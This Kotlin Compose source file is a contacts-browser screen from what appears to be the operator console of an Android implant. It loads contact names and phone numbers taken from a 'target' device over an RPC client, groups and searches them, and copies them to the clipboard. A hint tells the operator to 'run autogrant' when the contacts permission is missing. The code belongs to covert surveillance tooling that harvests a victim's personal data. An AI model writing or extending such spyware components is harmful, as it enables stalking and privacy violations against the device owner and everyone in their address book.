package com.shadow.operator.ui.cap

import android.widget.Toast
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import kotlinx.coroutines.launch

private data class Contact(val name: String, val entries: List<Pair<String, String>>)

/**
 * Contacts browser. The implant returns contacts/data/phones rows
 * (display_name, data1, data2); one person can appear on several rows, so rows
 * are grouped by display name and the detail sheet lists every number the
 * target holds for that person.
 */
@Composable
fun ContactsScreen(rpc: RpcClient, onNavigateBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    val clipboard = LocalClipboardManager.current
    val ctx = LocalContext.current
    val load = remember { CapLoad("contacts") }
    var query by remember { mutableStateOf("") }
    var open by remember { mutableStateOf<Contact?>(null) }

    LaunchedEffect(Unit) { load.run(rpc) }

    val all: List<Contact> = remember(load.raw) {
        load.table().rows.mapNotNull { r ->
            if (r.size < 2) return@mapNotNull null
            val name = r[0].ifBlank { "(no name)" }
            Contact(name, listOf(r[1] to (r.getOrNull(2) ?: "")))
        }.groupBy { it.name }.map { (name, parts) ->
            Contact(name, parts.flatMap { it.entries })
        }.sortedBy { it.name.lowercase() }
    }

    val shown = remember(all, query) {
        if (query.isBlank()) all
        else all.filter { c ->
            c.name.contains(query, true) || c.entries.any { it.first.contains(query, true) }
        }
    }

    CapabilityScreen(
        title = "Contacts",
        subtitle = if (load.error != null) "error"
        else "${shown.size} of ${all.size} people · ${load.tookMs} ms",
        onBack = onNavigateBack,
        loading = load.loading,
        onRefresh = { scope.launch { load.run(rpc) } },
        actions = {
            IconButton(onClick = {
                clipboard.setText(AnnotatedString(load.raw))
                Toast.makeText(ctx, "Copied ${load.raw.length} chars", Toast.LENGTH_SHORT).show()
            }) {
                Icon(Icons.Default.ContentCopy, "Copy all", tint = CapText)
            }
        }
    ) {
        load.error?.let {
            CapMessage(it.take(400), CapRed)
            return@CapabilityScreen
        }

        CapSearch(query, { query = it }, "search ${all.size} contacts by name or number")

        if (shown.isEmpty() && !load.loading) {
            CapMessage(
                if (all.isEmpty()) "no contacts on this target\n(run autogrant if READ_CONTACTS is missing)"
                else "no match for \"$query\"",
                if (all.isEmpty()) CapAmber else CapFaint
            )
            return@CapabilityScreen
        }

        LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(bottom = 16.dp)) {
            items(shown) { c ->
                Column(Modifier.fillMaxWidth().clickable { open = c }
                    .padding(horizontal = 16.dp, vertical = 10.dp)) {
                    Text(c.name, color = CapText, fontSize = 14.sp, fontWeight = FontWeight.Medium,
                        fontFamily = FontFamily.Monospace)
                    Text(
                        c.entries.firstOrNull()?.first ?: "-",
                        color = CapDim, fontSize = 12.sp, fontFamily = FontFamily.Monospace
                    )
                    if (c.entries.size > 1) {
                        Text("+${c.entries.size - 1} more", color = CapFaint, fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace)
                    }
                }
                HorizontalDivider(color = CapBorder)
            }
        }
    }

    open?.let { c ->
        AlertDialog(
            onDismissRequest = { open = null },
            containerColor = CapSurface,
            title = {
                Text(c.name, color = CapBright, fontSize = 15.sp, fontFamily = FontFamily.Monospace)
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    c.entries.forEach { (value, kind) ->
                        Column(Modifier.fillMaxWidth().clickable {
                            clipboard.setText(AnnotatedString(value))
                            Toast.makeText(ctx, "Copied $value", Toast.LENGTH_SHORT).show()
                        }) {
                            Text(kind.ifBlank { "number" }.uppercase(), color = CapFaint,
                                fontSize = 10.sp, fontFamily = FontFamily.Monospace)
                            Text(value, color = CapGreen, fontSize = 15.sp,
                                fontFamily = FontFamily.Monospace)
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { open = null }) {
                    Text("Close", color = CapBlue, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                }
            }
        )
    }
}
